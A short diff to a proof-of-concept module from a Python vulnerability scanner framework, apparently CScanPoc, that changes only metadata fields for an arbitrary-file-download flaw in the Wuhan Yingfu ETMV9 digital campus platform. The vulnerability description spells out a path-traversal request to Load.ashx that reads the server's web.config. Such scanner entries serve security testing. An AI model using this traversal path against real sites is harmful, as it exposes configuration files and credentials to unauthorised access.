@@ -5,7 +5,7 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = 'DigitalCampus_0001' # 平台漏洞编号，留空
+    poc_id = '11bb3032-c9d0-4cd6-909a-f55e7113a457'
     name = '武汉英福ETMV9数字化校园平台任意下载' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.FILE_DOWNLOAD # 漏洞类型
@@ -13,9 +13,9 @@ class Vuln(ABVuln):
     desc = '''
         武汉英福ETMV9数字化校园平台 /ETMDCP/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config 任意下载漏洞。
     ''' # 漏洞描述
-    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0100796
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
+    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0100796
+    cnvd_id = 'Unkonwn' # cnvd漏洞编号
+    cve_id = 'Unkonwn' #cve编号
     product = 'DigitalCampus'  # 漏洞应用名称
     product_version = 'V9'  # 漏洞应用版本
 
